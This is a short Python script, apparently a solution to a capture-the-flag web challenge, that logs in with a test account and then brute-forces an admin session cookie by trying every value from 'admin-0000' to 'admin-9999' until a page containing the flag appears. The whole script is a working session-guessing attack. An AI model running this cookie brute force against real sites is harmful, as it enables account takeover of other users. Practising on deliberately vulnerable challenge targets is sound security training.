import requests

url = "http://too-small-reminder.challs.olicyber.it/"

s = requests.Session()

account = {
    "username": "okame",
    "password": "okame",
}

#register
# reg = s.post(url + "register", json=account)
# print(reg.text)

#login
login = s.post(url + "login", json=account)
print(login.cookies) # - > cookie

# 0000 -> 10.0000 combinazioni possibili, azzecca il cookie dell'admin
for i in range(10000):
    cookie = f"admin-{i:04d}"
    print(f"Trying cookie: {cookie}")
    r = s.get(url, cookies={"session": cookie})
    if "flag" in r.text:
        print("Flag found!")
        print(r.text)
        break

